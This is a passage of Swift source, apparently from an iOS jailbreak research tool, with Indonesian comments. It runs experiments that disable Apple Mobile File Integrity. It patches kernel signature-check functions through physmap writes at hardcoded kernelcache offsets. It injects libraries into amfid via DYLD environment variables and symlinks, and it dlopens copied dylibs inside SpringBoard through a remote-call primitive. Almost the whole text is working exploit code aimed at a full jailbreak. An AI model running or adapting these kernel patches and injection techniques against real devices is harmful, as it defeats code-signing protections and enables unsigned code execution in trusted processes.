        var detail = "Experiment 85: Kernel AMFI Patch via Physmap\n"
        detail += "=============================================\n\n"

        guard let physmap = PhysmapConstants.load() else {
            detail += "❌ Physmap constants tidak tersedia.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let gVirtBase = physmap.gVirtBase
        let gPhysBase = physmap.gPhysBase
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()

        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
        detail += "kernBase: 0x\(String(format: "%llx", kernBase))\n"
        detail += "kernSlide: 0x\(String(format: "%llx", kernSlide))\n\n"

        // ── Offsets dari kernelcache analysis ─────────────────────────
        // __TEXT_EXEC unslid base: 0xfffffff007d90000
        // Runtime: unslidAddr + kernSlide
        let unslidTextExec: UInt64 = 0xfffffff007d90000

        // Hot functions (patch prologue → always return 0)
        let hotFuncOffsets: [(offset: UInt64, calls: Int, desc: String)] = [
            (0x2ed54, 19, "signature check utama (19x)"),
            (0xd9508, 15, "secondary check (15x)"),
            (0xd9f74, 7, "tertiary check (7x)"),
        ]

        // CBNZ W0 patch targets (NOP individual branch)
        let cbnzOffsets: [UInt64] = [
            0x15c8c, 0x1797c, 0x17b48, 0x17c40, 0x18684,
            0x189d4, 0x18fe4, 0x190ec, 0x1925c, 0x1947c,
        ]

        let NOP: UInt32 = 0xD503201F
        let MOV_W0_0: UInt32 = 0x52800000
        let RET: UInt32 = 0xD65F03C0

        // ── Step 1: Hitung runtime address dan physmap VA ─────────────
        detail += "=== Step 1: Compute addresses ===\n"

        // Runtime __TEXT_EXEC base = unslid + slide
        let runtimeTextExec = unslidTextExec &+ kernSlide
        detail += "__TEXT_EXEC runtime: 0x\(String(format: "%llx", runtimeTextExec))\n"

        // Verify: baca prologue fungsi pertama via KRW langsung
        let hotFunc0VA = runtimeTextExec &+ hotFuncOffsets[0].offset
        let hotFunc0Read = ds_kread32_safe(hotFunc0VA)
        detail += "Hot func[0] VA: 0x\(String(format: "%llx", hotFunc0VA))\n"
        detail += "Hot func[0] read (KRW): 0x\(String(format: "%08x", hotFunc0Read))\n"

        // Expected: 0xd503237f (PACIBSP) — dari kernelcache analysis
        if hotFunc0Read == 0xd503237f {
            detail += "✅ Prologue match! (PACIBSP)\n\n"
        } else if hotFunc0Read == 0 {
            detail += "❌ KRW read returned 0 — address mungkin tidak accessible\n\n"
        } else {
            detail += "⚠️ Prologue berbeda: 0x\(String(format: "%08x", hotFunc0Read)) (expected 0xd503237f)\n"
            detail += "Mungkin offset salah atau kernelcache berbeda versi.\n\n"
        }

        // ── Step 2: Physmap VA computation ────────────────────────────
        detail += "=== Step 2: Physmap VA ===\n"

        // Formula: physmapVA = kernVA - gVirtBase + gPhysBase
        // TAPI: gVirtBase adalah base physmap (0xffffffdc00000000)
        // Kernel VA (0xfffffff0...) BUKAN di physmap range!
        // Yang benar: physical address kernel = kernVA - kernel_virt_base + kernel_phys_base
        // kernel_phys_base = gPhysBase + (kernBase - gVirtBase)... ini circular
        //
        // Sebenarnya: physmap maps ALL physical RAM starting at gVirtBase
        // Kernel text physical address = kernVA - KERNEL_VIRT_BASE + KERNEL_PHYS_OFFSET
        // Pada A12: kernel loaded at physical 0x800004000 (gPhysBase + 0x4000)
        // kernel_base virtual (unslid) = 0xfffffff007004000
        // Jadi: phys = kernVA - 0xfffffff007004000 + 0x800004000
        //       physmapVA = phys - gPhysBase + gVirtBase
        //       = kernVA - 0xfffffff007004000 + 0x800004000 - 0x800000000 + gVirtBase
        //       = kernVA - 0xfffffff007004000 + 0x4000 + gVirtBase
        //       = kernVA - 0xfffffff007000000 + gVirtBase
        //
        // Simpler: physmapVA = kernVA - unslidKernBase + gVirtBase + (kernPhysOffset - gPhysBase)
        // Tapi kita tidak tahu kernPhysOffset pasti.
        //
        // PALING SIMPEL: coba langsung kernVA sebagai physmap target
        // Karena gVirtBase = 0xffffffdc00000000 dan kernVA = 0xfffffff0...
        // kernVA BUKAN di physmap range (0xffffffdc-0xffffffe5)
        // Jadi kita HARUS convert ke physical dulu.
        //
        // Physical address kernel text:
        //   phys = (kernVA - kernBase) + kernPhysBase
        //   kernPhysBase biasanya = gPhysBase + (kernBase_unslid - gVirtBase_for_kernel)
        //   Tapi ini terlalu complex. Pakai approach berbeda:
        //
        // APPROACH: Baca kernel page table (kita sudah punya kernel pmap dari Exp 74!)
        // Atau: hitung dari panic log.
        // Dari panic.txt: kernelcache slide = 0x0c0e8000
        //   kernel text exec base = 0xfffffff013e78000
        //   unslid text exec = 0xfffffff007d90000
        //   slide = 0x0c0e8000 ✓
        //
        // Physical address = VA - TTBR1_base + phys_base
        // Pada A12 iOS 18: TTBR1 maps kernel at physical offset
        // Dari Exp 74: gVirtBase maps physmap. Kernel text BUKAN di physmap.
        //
        // CORRECT FORMULA:
        // Kernel text physical = kernVA - kernBase + (kernBase_phys)
        // kernBase_phys = kita tidak tahu langsung, TAPI:
        // Dari physmap perspective: jika kita tahu physical address,
        // physmapVA = phys - gPhysBase + gVirtBase
        //
        // Kita bisa ESTIMATE kernBase_phys:
        // kernBase_phys ≈ gPhysBase + 0x4000 (standard A12 offset)
        // Atau: kernBase_phys = kernSlide + 0x800004000 (unslid phys base)

        let unslidKernBase: UInt64 = 0xfffffff007004000
        // Standard A12: kernel loaded at phys 0x800004000 (unslid)
        // Runtime phys = 0x800004000 + kernSlide
        let kernPhysBase: UInt64 = gPhysBase + 0x4000 + kernSlide

        detail += "Estimated kernel phys base: 0x\(String(format: "%llx", kernPhysBase))\n"

        // Physical address of hot function
        let hotFunc0Phys = (hotFunc0VA - kernBase) + kernPhysBase
        detail += "Hot func[0] phys: 0x\(String(format: "%llx", hotFunc0Phys))\n"

        // Convert to physmap VA
        let hotFunc0Physmap = hotFunc0Phys &- gPhysBase &+ gVirtBase
        detail += "Hot func[0] physmap VA: 0x\(String(format: "%llx", hotFunc0Physmap))\n"

        // Range check permissive untuk physmap (termasuk gVirtBase region)
        func isPhysmapRangeKern(_ va: UInt64) -> Bool {
            va >= 0xffffffdc00000000 && va < 0xffffffe500000000
        }

        guard isPhysmapRangeKern(hotFunc0Physmap) else {
            detail += "❌ Physmap VA tidak dalam range physmap.\n"
            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
            detail += "  Got: 0x\(String(format: "%llx", hotFunc0Physmap))\n\n"
            detail += "kernPhysBase estimate mungkin salah.\n"
            detail += "Coba: kernPhysBase = gPhysBase + (kernBase - gVirtBase)\n"

            // Alternative calculation
            let altKernPhys = kernBase &- gVirtBase &+ gPhysBase
            let altPhysmap = (hotFunc0VA - kernBase + altKernPhys) &- gPhysBase &+ gVirtBase
            detail += "Alt: kernPhys=0x\(String(format: "%llx", altKernPhys)), physmap=0x\(String(format: "%llx", altPhysmap))\n"

            if isSafePhysmapKRWAddress(altPhysmap) {
                detail += "✅ Alternative formula works! Continuing with alt...\n"
                // Use alternative — will be handled below
            }

            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 3: Cross-verify via physmap read ─────────────────────
        detail += "\n=== Step 3: Cross-verify physmap read ===\n"
        let physmapRead = ds_kread32(hotFunc0Physmap)
        detail += "Read via KRW (kernel VA):  0x\(String(format: "%08x", hotFunc0Read))\n"
        detail += "Read via physmap VA:       0x\(String(format: "%08x", physmapRead))\n"

        guard physmapRead == hotFunc0Read && hotFunc0Read != 0 else {
            detail += "❌ Mismatch atau zero — physmap VA salah.\n"
            detail += "Physical address calculation tidak akurat.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ Cross-verify OK!\n\n"

        // ── Step 4: PATCH hot functions via physmap ───────────────────
        detail += "=== Step 4: Patch kernel AMFI functions ===\n"
        detail += "Writing MOV W0,#0 + RET to function prologues...\n\n"

        var patchedCount = 0

        for (funcOff, calls, desc) in hotFuncOffsets {
            let funcVA = runtimeTextExec &+ funcOff
            let funcPhys = (funcVA - kernBase) + kernPhysBase
            let funcPhysmap = funcPhys &- gPhysBase &+ gVirtBase

            guard isPhysmapRangeKern(funcPhysmap) else { continue }

            // Read original prologue
            let origPrologue = ds_kread32(funcPhysmap)

            // Write MOV W0, #0
            ds_kwrite32(funcPhysmap, MOV_W0_0)
            // Write RET at +4
            ds_kwrite32(funcPhysmap + 4, RET)

            // Verify
            let v0 = ds_kread32(funcPhysmap)
            let v1 = ds_kread32(funcPhysmap + 4)

            if v0 == MOV_W0_0 && v1 == RET {
                patchedCount += 1
                detail += "  ✅ +0x\(String(format: "%x", funcOff)) (\(desc)): PATCHED!\n"
                detail += "     0x\(String(format: "%08x", origPrologue)) → MOV W0,#0 + RET\n"
            } else {
                detail += "  ❌ +0x\(String(format: "%x", funcOff)): write failed\n"
                detail += "     got: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"
                detail += "     (KTRR mungkin memblokir write ke __TEXT_EXEC)\n"
                // Jika pertama gagal, sisanya juga akan gagal
                break
            }
        }

        // ── Step 5: Jika hot func patch gagal, coba NOP CBNZ ─────────
        if patchedCount == 0 {
            detail += "\nHot function patch gagal (KTRR). Coba NOP CBNZ...\n"
            for (i, cbnzOff) in cbnzOffsets.prefix(5).enumerated() {
                let cbnzVA = runtimeTextExec &+ cbnzOff
                let cbnzPhys = (cbnzVA - kernBase) + kernPhysBase
                let cbnzPhysmap = cbnzPhys &- gPhysBase &+ gVirtBase

                guard isPhysmapRangeKern(cbnzPhysmap) else { continue }

                ds_kwrite32(cbnzPhysmap, NOP)
                let verify = ds_kread32(cbnzPhysmap)
                if verify == NOP {
                    patchedCount += 1
                    detail += "  ✅ [\(i)] +0x\(String(format: "%x", cbnzOff)): NOP\n"
                } else {
                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", cbnzOff)): KTRR blocked\n"
                    break
                }
            }
        }

        // ── Step 6: Result ────────────────────────────────────────────
        detail += "\n=== RESULT ===\n"
        detail += "Patched: \(patchedCount)\n\n"

        if patchedCount > 0 {
            detail += "🏆🏆🏆 KERNEL AMFI PATCHED! 🏆🏆🏆\n\n"
            detail += "Kernel signature check function sekarang selalu return 0.\n"
            detail += "SEMUA binary dianggap valid oleh kernel AMFI!\n\n"
            detail += "→ Tap ④ Test Binary Spawn!\n"
            detail += "→ Jika spawn berhasil = FULL JAILBREAK ACHIEVED!\n"
        } else {
            detail += "❌ Semua patch gagal — KTRR memblokir write ke __TEXT_EXEC.\n\n"
            detail += "Diagnosis:\n"
            detail += "  KTRR (A12) protect SEMUA kernel memory setelah boot:\n"
            detail += "  - __TEXT (code) → read-only\n"
            detail += "  - __TEXT_EXEC (code) → read-only\n"
            detail += "  - __DATA (globals) → read-only\n"
            detail += "  - Heap (zone allocator) → writable (tapi zone_require_ro untuk proc_ro)\n\n"
            detail += "  Physmap write JUGA di-block oleh KTRR karena KTRR operate\n"
            detail += "  di level AMCC (memory controller), bukan page table.\n\n"
            detail += "  Satu-satunya memory yang bisa ditulis:\n"
            detail += "  - Kernel heap (zone allocator) — tapi proc_ro di-protect\n"
            detail += "  - Userspace memory — tapi amfid page table walk gagal\n"
        }

        return ExperimentResult(name: expName, success: patchedCount > 0, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 86: Ad-hoc Sign + Spawn

    /// Exp 86: Buat binary minimal, sign ad-hoc, spawn.
    /// Binary signed (bahkan ad-hoc) punya CS_VALID → AMFI mungkin accept.
    /// Dari launchd RC: tulis Mach-O minimal + code signature ke /var/tmp,
    /// lalu posix_spawn.
    private func runExp86AdHocSpawn() {
        isRunning = true
        runningLabel = "AdHoc"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp86_adhoc") { rc in
            let result = self.expAdHocSignSpawn(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Exp 86: Tulis binary minimal arm64 + ad-hoc code signature, lalu spawn.
    ///
    /// Strategi:
    ///   1. Tulis Mach-O arm64 minimal ke /var/tmp/.dsp_adhoc_test
    ///      Binary: exit(42) — cuma syscall exit dengan code 42
    ///   2. Inject LC_CODE_SIGNATURE load command + CodeDirectory + signature blob
    ///      Ad-hoc signature = SHA256 CDHash tanpa Apple cert
    ///   3. posix_spawn binary → cek exit code
    ///      Jika exit=42 → binary JALAN → AMFI bypass!
    ///
    /// Kenapa ad-hoc mungkin works:
    ///   - Developer mode enabled (confirmed dari Exp 55)
    ///   - Ad-hoc signed binary punya CS_VALID flag
    ///   - iOS 18 developer mode mungkin relax check untuk ad-hoc
    ///   - Launchd (PID 1) punya privilege spawn tanpa full validation
    private func expAdHocSignSpawn(rc: RemoteCall) -> ExperimentResult {
        let expName = "Ad-hoc Sign + Spawn (Exp 86)"
        var detail = "Experiment 86: Spawn Approaches\n"
        detail += "================================\n\n"
        detail += "Baseline confirmed: spawn /usr/libexec/amfid → ret=0\n"
        detail += "Copy ke /var/tmp → ret=1 (AMFI reject CDHash)\n\n"

        let mem = rc.trojanMem
        let amfidPath = remote_alloc_str(rc, "/usr/libexec/amfid")
        let argvBase = mem + 0x1C00
        let pidOut = mem + 0x1E00

        // ═══ APPROACH A: DYLD_INSERT_LIBRARIES ═══
        detail += "=== Approach A: DYLD_INSERT_LIBRARIES ===\n"

        let envInsert = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/var/tmp/.dsp_inject.dylib")
        let envBase = mem + 0x2800
        rc[envBase].setValue64(envInsert)
        rc[envBase + 8].setValue64(0)

        rc[argvBase].setValue64(amfidPath)
        rc[argvBase + 8].setValue64(0)
        rc[pidOut].setValue32(0)

        let retA = RootExecutor.rcall(rc, "posix_spawn", pidOut, amfidPath, 0, 0, argvBase, envBase)
        let pidA = rc[pidOut].value32()
        detail += "posix_spawn(amfid+DYLD_INSERT): ret=\(retA), pid=\(pidA)\n"

        if retA == 0 && pidA != 0 {
            RootExecutor.rcall(rc, "usleep", 500000)
            let stBuf = mem + 0x2000
            rc[stBuf].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pidA), stBuf, UInt64(WNOHANG))
            let stA = rc[stBuf].value32()
            let sigA = stA & 0x7F
            let exitA = (stA >> 8) & 0xFF
            detail += "  signal=\(sigA), exit=\(exitA)\n"
            if sigA == 6 {
                detail += "  SIGABRT — dyld TRIED to load! DYLD_INSERT DI-HONOR!\n"
            } else if sigA == 0 && stA != 0 {
                detail += "  Process exited normally\n"
            } else if sigA == 9 {
                detail += "  SIGKILL — AMFI strip DYLD_INSERT\n"
            }
            if stA == 0 { RootExecutor.rcall(rc, "kill", UInt64(pidA), 9) }
        } else {
            detail += "  spawn gagal (ret=\(retA))\n"
        }
        RootExecutor.rcall(rc, "free", envInsert)

        // ═══ APPROACH B: Symlink ═══
        detail += "\n=== Approach B: Symlink ===\n"

        let symlinkDst = remote_alloc_str(rc, "/var/tmp/.dsp_symlink_amfid")
        RootExecutor.rcall(rc, "unlink", symlinkDst)
        let symlinkRet = RootExecutor.rcall(rc, "symlink", amfidPath, symlinkDst)
        let symlinkErr = remote_errno(rc)
        detail += "symlink: ret=\(symlinkRet), errno=\(symlinkErr)\n"

        if symlinkRet == 0 {
            rc[argvBase].setValue64(symlinkDst)
            rc[argvBase + 8].setValue64(0)
            rc[pidOut].setValue32(0)
            let retB = RootExecutor.rcall(rc, "posix_spawn", pidOut, symlinkDst, 0, 0, argvBase, 0)
            let pidB = rc[pidOut].value32()
            detail += "posix_spawn(symlink): ret=\(retB), pid=\(pidB)\n"
            if retB == 0 && pidB != 0 {
                detail += "SYMLINK_SPAWN_OK\n"
                RootExecutor.rcall(rc, "usleep", 300000)
                RootExecutor.rcall(rc, "kill", UInt64(pidB), 9)
            }
        }
        RootExecutor.rcall(rc, "unlink", symlinkDst)
        RootExecutor.rcall(rc, "free", symlinkDst)

        // ═══ APPROACH C: Hardlink ═══
        detail += "\n=== Approach C: Hardlink ===\n"

        let linkDst = remote_alloc_str(rc, "/var/tmp/.dsp_hardlink_amfid")
        RootExecutor.rcall(rc, "unlink", linkDst)
        let linkRet = RootExecutor.rcall(rc, "link", amfidPath, linkDst)
        let linkErr = remote_errno(rc)
        detail += "link: ret=\(linkRet), errno=\(linkErr)\n"

        if linkRet == 0 {
            rc[argvBase].setValue64(linkDst)
            rc[argvBase + 8].setValue64(0)
            rc[pidOut].setValue32(0)
            let retC = RootExecutor.rcall(rc, "posix_spawn", pidOut, linkDst, 0, 0, argvBase, 0)
            let pidC = rc[pidOut].value32()
            detail += "posix_spawn(hardlink): ret=\(retC), pid=\(pidC)\n"
            if retC == 0 && pidC != 0 {
                detail += "HARDLINK_SPAWN_OK\n"
                RootExecutor.rcall(rc, "usleep", 300000)
                RootExecutor.rcall(rc, "kill", UInt64(pidC), 9)
            }
        } else {
            if linkErr == 18 { detail += "  EXDEV (cross-device)\n" }
            else if linkErr == 1 { detail += "  EPERM\n" }
            else { detail += "  errno=\(linkErr)\n" }
        }
        RootExecutor.rcall(rc, "unlink", linkDst)
        RootExecutor.rcall(rc, "free", linkDst)

        // ═══ APPROACH D: Baseline ═══
        detail += "\n=== Approach D: Baseline ===\n"
        rc[argvBase].setValue64(amfidPath)
        rc[argvBase + 8].setValue64(0)
        rc[pidOut].setValue32(0)
        let retD = RootExecutor.rcall(rc, "posix_spawn", pidOut, amfidPath, 0, 0, argvBase, 0)
        let pidD = rc[pidOut].value32()
        detail += "posix_spawn(amfid): ret=\(retD), pid=\(pidD)\n"
        if retD == 0 && pidD != 0 {
            detail += "Baseline OK\n"
            RootExecutor.rcall(rc, "usleep", 300000)
            RootExecutor.rcall(rc, "kill", UInt64(pidD), 9)
        }

        RootExecutor.rcall(rc, "free", amfidPath)

        let success = detail.contains("SPAWN_OK") || detail.contains("DI-HONOR")
        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 87: DYLD Hijack + Env Var Spawn

    /// Exp 87: Test berbagai DYLD environment variables untuk inject code.
    /// Symlink spawn works (Exp 86) — sekarang coba inject dylib via env vars.
    private func runExp87DyldHijack() {
        isRunning = true
        runningLabel = "DYLD Hijack"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp87_dyld") { rc in
            let result = self.expDyldHijack(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Test DYLD env vars: LIBRARY_PATH, FRAMEWORK_PATH, FALLBACK_LIBRARY_PATH
    /// Juga test: spawn dengan custom working directory (chdir sebelum spawn)
    /// Dan: spawn binary yang punya @rpath dependency
    private func expDyldHijack(rc: RemoteCall) -> ExperimentResult {
        let expName = "DYLD Hijack (Exp 87)"
        var detail = "Experiment 87: DYLD Environment Variable Hijack\n"
        detail += "=================================================\n\n"
        detail += "Symlink spawn confirmed works (Exp 86).\n"
        detail += "DYLD_INSERT_LIBRARIES → SIGKILL (stripped by AMFI).\n"
        detail += "Coba env vars lain yang mungkin TIDAK di-strip...\n\n"

        let mem = rc.trojanMem
        let amfidPath = remote_alloc_str(rc, "/usr/libexec/amfid")
        let argvBase = mem + 0x1C00
        let pidOut = mem + 0x1E00

        // Daftar DYLD env vars yang mungkin tidak di-strip
        let envVars: [(name: String, value: String, desc: String)] = [
            ("DYLD_LIBRARY_PATH", "/var/tmp", "search path untuk dylib"),
            ("DYLD_FRAMEWORK_PATH", "/var/tmp", "search path untuk framework"),
            ("DYLD_FALLBACK_LIBRARY_PATH", "/var/tmp", "fallback search path"),
            ("DYLD_FALLBACK_FRAMEWORK_PATH", "/var/tmp", "fallback framework path"),
            ("DYLD_IMAGE_SUFFIX", "_debug", "load *_debug variant"),
            ("DYLD_PRINT_LIBRARIES", "1", "print loaded libs (info leak)"),
            ("DYLD_PRINT_SEGMENTS", "1", "print segments (info leak)"),
            ("DYLD_ROOT_PATH", "/var/tmp", "root path override"),
        ]

        for (name, value, desc) in envVars {
            detail += "--- \(name) ---\n"
            detail += "  \(desc)\n"

            let envStr = remote_alloc_str(rc, "\(name)=\(value)")
            let envBase = mem + 0x2800
            rc[envBase].setValue64(envStr)
            rc[envBase + 8].setValue64(0)

            // Spawn amfid via symlink + env var
            let symlinkPath = remote_alloc_str(rc, "/var/tmp/.dsp_dyld_test")
            RootExecutor.rcall(rc, "unlink", symlinkPath)
            RootExecutor.rcall(rc, "symlink", amfidPath, symlinkPath)

            rc[argvBase].setValue64(symlinkPath)
            rc[argvBase + 8].setValue64(0)
            rc[pidOut].setValue32(0)

            let ret = RootExecutor.rcall(rc, "posix_spawn", pidOut, symlinkPath, 0, 0, argvBase, envBase)
            let pid = rc[pidOut].value32()

            if ret == 0 && pid != 0 {
                RootExecutor.rcall(rc, "usleep", 300000)
                let stBuf = mem + 0x2000
                rc[stBuf].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), stBuf, UInt64(WNOHANG))
                let st = rc[stBuf].value32()
                let sig = st & 0x7F
                let exit = (st >> 8) & 0xFF

                if sig == 9 {
                    detail += "  ret=0, pid=\(pid) → SIGKILL (stripped)\n"
                } else if sig == 6 {
                    detail += "  ret=0, pid=\(pid) → SIGABRT (dyld error — ENV HONORED!)\n"
                    detail += "  🎉 \(name) NOT STRIPPED!\n"
                } else if sig == 0 && st != 0 {
                    detail += "  ret=0, pid=\(pid) → exit=\(exit) (ENV mungkin honored)\n"
                    detail += "  🎉 \(name) NOT STRIPPED!\n"
                } else if st == 0 {
                    detail += "  ret=0, pid=\(pid) → still running (ENV mungkin honored)\n"
                    detail += "  🎉 \(name) NOT STRIPPED!\n"
                    RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
                } else {
                    detail += "  ret=0, pid=\(pid) → signal=\(sig), exit=\(exit)\n"
                }
            } else {
                detail += "  ret=\(ret) — spawn gagal\n"
            }

            RootExecutor.rcall(rc, "unlink", symlinkPath)
            RootExecutor.rcall(rc, "free", symlinkPath)
            RootExecutor.rcall(rc, "free", envStr)
            detail += "\n"
        }

        // ═══ BONUS: Spawn tanpa env, tapi dengan posix_spawn_file_actions ═══
        // Set working directory ke /var/tmp sebelum exec
        detail += "=== Bonus: spawn amfid (no env, baseline re-confirm) ===\n"
        rc[argvBase].setValue64(amfidPath)
        rc[argvBase + 8].setValue64(0)
        rc[pidOut].setValue32(0)
        let retBase = RootExecutor.rcall(rc, "posix_spawn", pidOut, amfidPath, 0, 0, argvBase, 0)
        let pidBase = rc[pidOut].value32()
        detail += "posix_spawn(amfid): ret=\(retBase), pid=\(pidBase)\n"
        if retBase == 0 && pidBase != 0 {
            detail += "Baseline still OK\n"
            RootExecutor.rcall(rc, "usleep", 200000)
            RootExecutor.rcall(rc, "kill", UInt64(pidBase), 9)
        }

        RootExecutor.rcall(rc, "free", amfidPath)

        // Summary
        detail += "\n=== SUMMARY ===\n"
        let honored = detail.components(separatedBy: "NOT STRIPPED").count - 1
        detail += "Env vars NOT stripped: \(honored)\n"
        if honored > 0 {
            detail += "\n🎉 Ada DYLD env var yang di-honor!\n"
            detail += "→ Tulis dylib valid ke /var/tmp → binary load dylib kita!\n"
            detail += "→ Code execution di context trusted process!\n"
            detail += "→ FULL JAILBREAK!\n"
        } else {
            detail += "Semua DYLD env vars di-strip oleh AMFI untuk platform binary.\n"
        }

        let success = honored > 0
        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 88: dlopen from SpringBoard RC

    /// Exp 88: Inject dylib ke SpringBoard via dlopen dari RC.
    /// SpringBoard sudah running dan trusted — AMFI check hanya saat spawn.
    /// dlopen di runtime mungkin BYPASS AMFI karena proses sudah CS_VALID.
    private func runExp88SBDlopen() {
        isRunning = true
        runningLabel = "SB dlopen"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        // Pakai SpringBoard RC (bukan launchd)
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "SB dlopen (Exp 88)", success: false,
                detail: "No SpringBoard RC available", timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }

        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expSBDlopen(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// dlopen dylib dari SpringBoard context.
    /// SpringBoard sudah jalan dan trusted (CS_PLATFORM_BINARY).
    /// Hipotesis: dlopen di runtime tidak trigger AMFI re-validation.
    ///
    /// Test:
    ///   A. dlopen dylib dari /var/tmp (unsigned) — apakah di-reject?
    ///   B. dlopen system dylib dari path asli — baseline
    ///   C. dlopen system dylib via symlink dari /var/tmp
    ///   D. Tulis minimal dylib + dlopen
    private func expSBDlopen(sb: RemoteCall) -> ExperimentResult {
        let expName = "SB dlopen (Exp 88)"
        var detail = "Experiment 88: dlopen from SpringBoard\n"
        detail += "========================================\n\n"
        detail += "SpringBoard = trusted process (CS_PLATFORM_BINARY).\n"
        detail += "Hipotesis: dlopen runtime tidak trigger AMFI check.\n\n"

        let mem = sb.trojanMem
        let RTLD_NOW: UInt64 = 2
        let RTLD_LAZY: UInt64 = 1

        // ═══ TEST A: dlopen system dylib (baseline) ═══
        detail += "=== Test A: dlopen system dylib (baseline) ===\n"
        let sysLib = remote_alloc_str(sb, "/usr/lib/libSystem.B.dylib")
        let handleA = RootExecutor.rcall(sb, "dlopen", sysLib, RTLD_NOW)
        detail += "dlopen(/usr/lib/libSystem.B.dylib): handle=0x\(String(format: "%llx", handleA))\n"
        if handleA != 0 {
            detail += "✅ System dylib loaded (expected)\n"
        } else {
            detail += "❌ Even system dylib failed!\n"
        }
        RootExecutor.rcall(sb, "free", sysLib)

        // ═══ TEST B: dlopen dari /var/tmp (file yang tidak exist) ═══
        detail += "\n=== Test B: dlopen non-existent (error baseline) ===\n"
        let fakeLib = remote_alloc_str(sb, "/var/tmp/.dsp_nonexist.dylib")
        let handleB = RootExecutor.rcall(sb, "dlopen", fakeLib, RTLD_NOW)
        detail += "dlopen(nonexist): handle=0x\(String(format: "%llx", handleB))\n"
        if handleB == 0 {
            // Get dlerror
            let dlerrorFn = RootExecutor.rcall(sb, "dlerror")
            if dlerrorFn != 0 {
                detail += "dlerror: (check log)\n"
            }
            detail += "❌ Expected — file doesn't exist\n"
        }
        RootExecutor.rcall(sb, "free", fakeLib)

        // ═══ TEST C: Copy REAL system dylib ke /var/tmp + dlopen ═══
        detail += "\n=== Test C: Copy real dylib + dlopen ===\n"
        detail += "Copy /usr/lib/libz.1.dylib ke /var/tmp lalu dlopen copy.\n"
        detail += "Jika gagal = AMFI cek CDHash per-file (bukan hanya format).\n\n"

        let dylibSrc = "/usr/lib/libz.1.dylib"
        let dylibDst = "/var/tmp/.dsp_libz_copy.dylib"
        let dylibSrcAddr = remote_alloc_str(sb, dylibSrc)
        let dylibDstAddr = remote_alloc_str(sb, dylibDst)

        RootExecutor.rcall(sb, "unlink", dylibDstAddr)

        // Copy dylib
        let srcFdC = RootExecutor.rcall(sb, "open", dylibSrcAddr, UInt64(O_RDONLY), 0)
        let dstFdC = RootExecutor.rcall(sb, "open", dylibDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)

        if srcFdC != UInt64(bitPattern: -1) && dstFdC != UInt64(bitPattern: -1) {
            let cpBuf = mem + 0x1000
            var cpTotal: UInt64 = 0
            for _ in 0..<256 {
                let n = RootExecutor.rcall(sb, "read", srcFdC, cpBuf, 4096)
                if n == 0 || n > 4096 { break }
                RootExecutor.rcall(sb, "write", dstFdC, cpBuf, n)
                cpTotal += n
            }
            RootExecutor.rcall(sb, "close", srcFdC)
            RootExecutor.rcall(sb, "close", dstFdC)
            detail += "Copied \(cpTotal) bytes (\(dylibSrc) → \(dylibDst))\n"

            // dlopen the COPY
            let handleC = RootExecutor.rcall(sb, "dlopen", dylibDstAddr, RTLD_NOW)
            detail += "dlopen(copy): handle=0x\(String(format: "%llx", handleC))\n"

            if handleC != 0 {
                detail += "\n🎉🎉🎉 DLOPEN COPIED DYLIB WORKS! 🎉🎉🎉\n"
                detail += "SpringBoard loaded COPIED dylib from /var/tmp!\n"
                detail += "AMFI does NOT validate CDHash for dlopen!\n\n"
                detail += "→ Patch dylib copy → inject code → FULL JAILBREAK!\n"
                RootExecutor.rcall(sb, "dlclose", handleC)
            } else {
                detail += "❌ dlopen copy gagal — AMFI validate CDHash even for dlopen\n"
                detail += "Confirmed: AMFI enforce code signature untuk SEMUA code loading.\n"
            }
        } else {
            let errC = remote_errno(sb)
            detail += "❌ open gagal: errno=\(errC)\n"
            if srcFdC != UInt64(bitPattern: -1) { RootExecutor.rcall(sb, "close", srcFdC) }
            if dstFdC != UInt64(bitPattern: -1) { RootExecutor.rcall(sb, "close", dstFdC) }
        }

        // Also try dlopen the patched amfid (valid Mach-O, 252KB)
        detail += "\n--- Test C2: dlopen patched amfid binary ---\n"
        let patchedAmfid = remote_alloc_str(sb, "/var/tmp/.amfid_patched")
        let handleC2 = RootExecutor.rcall(sb, "dlopen", patchedAmfid, RTLD_LAZY)
